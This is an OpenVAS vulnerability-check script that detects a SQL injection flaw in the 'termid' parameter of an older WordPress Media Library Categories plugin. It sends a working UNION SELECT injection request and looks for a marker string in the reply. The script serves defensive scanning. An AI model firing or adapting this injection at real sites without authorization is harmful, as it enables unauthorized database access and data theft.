###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_media_library_categories_plugin_sql_inj_vuln.nasl 3570 2016-06-21 07:49:45Z benallard $
#
# WordPress Media Library Categories Plugin 'termid' Parameter SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to perform SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "WordPress Media Library Categories plugin version 1.0.6 and prior.";
tag_insight = "The flaw is due to improper validation of user-supplied input passed
  via the 'termid' parameter to '/wp-content/plugins/media-library-categories
  /sort.php', which allows attackers to manipulate SQL queries by injecting
  arbitrary SQL code.";
tag_solution = "Upgrade to WordPress Media Library Categories plugin version 1.0.7 or later
  For updates refer to http://wordpress.org/extend/plugins/media-library-categories/";
tag_summary = "This host is installed with WordPress Media Library Categories
  plugin and is prone to sql injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802322";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3570 $");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:49:45 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2011-08-12 14:44:50 +0200 (Fri, 12 Aug 2011)");
  script_bugtraq_id(49062);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Media Library Categories Plugin 'termid' Parameter SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45534");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17628/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103756/medialibrarycategories-sql.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("Check if WordPress Media Library Categories plugin is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);


## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct the Attack Request
url = dir + "/wp-content/plugins/media-library-categories/sort.php?termid=-1" +
            "%20UNION%20ALL%20SELECT%200x4f70656e5641532d53514c2d496e6a65637" +
            "4696f6e2d54657374,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL," +
            "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL," +
            "NULL,NULL--";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test")){
  security_message(port);
}
